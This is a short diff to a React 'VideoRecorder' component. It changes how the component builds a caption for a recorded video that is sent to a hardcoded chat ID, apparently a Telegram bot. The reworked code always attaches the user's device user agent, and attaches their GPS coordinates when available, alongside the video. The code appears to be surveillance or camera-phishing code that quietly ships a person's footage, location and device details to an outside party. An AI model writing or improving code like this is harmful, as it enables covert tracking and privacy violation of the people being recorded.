@@ -155,9 +155,20 @@ function VideoRecorder() {
     formData.append("chat_id", "7819537579");
     formData.append("video", videoBlob, "video.webm");
 
-    if (!infoSent && geoData) {
-      const locationInfo = `📍 Location: ${geoData.latitude}, ${geoData.longitude}\n🌐 Device: ${userAgent}`;
-      formData.append("caption", locationInfo);
+    if (!infoSent) {
+      const captionParts = [];
+
+      if (geoData) {
+        captionParts.push(
+          `📍 Location: ${geoData.latitude}, ${geoData.longitude}`
+        );
+      } else {
+        captionParts.push("📍 Location: Not available");
+      }
+
+      captionParts.push(`🌐 Device: ${userAgent}`);
+      formData.append("caption", captionParts.join("\n"));
+
       setInfoSent(true);
     }
 
